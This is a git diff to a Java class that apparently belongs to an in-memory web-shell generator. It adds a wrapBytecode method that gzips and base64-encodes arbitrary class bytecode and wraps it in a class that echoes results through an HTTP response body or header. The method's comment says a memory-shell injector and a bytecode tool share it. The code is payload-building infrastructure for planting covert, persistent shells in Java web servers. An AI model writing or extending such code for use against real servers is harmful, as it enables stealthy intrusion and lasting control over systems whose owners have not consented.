@@ -15,6 +15,8 @@ import com.reajason.javaweb.probe.payload.FilterProbeFactory;
 import com.reajason.javaweb.probe.payload.ScriptEngineProbe;
 import com.reajason.javaweb.probe.payload.ServerProbe;
 import com.reajason.javaweb.probe.payload.response.*;
+import com.reajason.javaweb.utils.Base64Utils;
+import com.reajason.javaweb.utils.CommonUtil;
 import com.reajason.javaweb.utils.NameSampler;
 import com.reajason.javaweb.utils.ShellCommonUtil;
 import net.bytebuddy.ByteBuddy;
@@ -56,6 +58,31 @@ public class ResponseGenerator extends ByteBuddyShellGenerator<ResponseConfig> {
 
     public static List<String> getSupportedServers() {
         return new ArrayList<>(WRITER_CLASSES.keySet());
+    }
+
+    /**
+     * 把任意类字节码嵌入回显 Wrapper；内存马注入器与独立字节码工具共用此入口。
+     */
+    public static byte[] wrapBytecode(ProbeConfig probeConfig, String server,
+                                      String wrapperClassName, byte[] bytecode) {
+        ProbeMethod probeMethod = probeConfig.getProbeMethod();
+        if (probeMethod == null) {
+            probeMethod = ProbeMethod.ResponseBody;
+            probeConfig.setProbeMethod(probeMethod);
+        }
+        if (probeMethod != ProbeMethod.ResponseBody && probeMethod != ProbeMethod.ResponseHeader) {
+            throw new GenerationException("memshell probeMethod must be ResponseBody or ResponseHeader: " + probeMethod);
+        }
+        probeConfig.setShellClassName(wrapperClassName);
+        probeConfig.setProbeContent(ProbeContent.Bytecode);
+        ResponseConfig responseConfig = ResponseConfig.builder()
+                .server(server)
+                .base64Bytes(Base64Utils.encodeBase64String(CommonUtil.gzipCompress(bytecode)))
+                .respHeaderName(probeConfig.getRespHeaderName())
+                .build();
+        byte[] wrapperBytes = new ResponseGenerator(probeConfig, responseConfig).getBytes();
+        probeConfig.setRespHeaderName(responseConfig.getRespHeaderName());
+        return wrapperBytes;
     }
 
     @Override
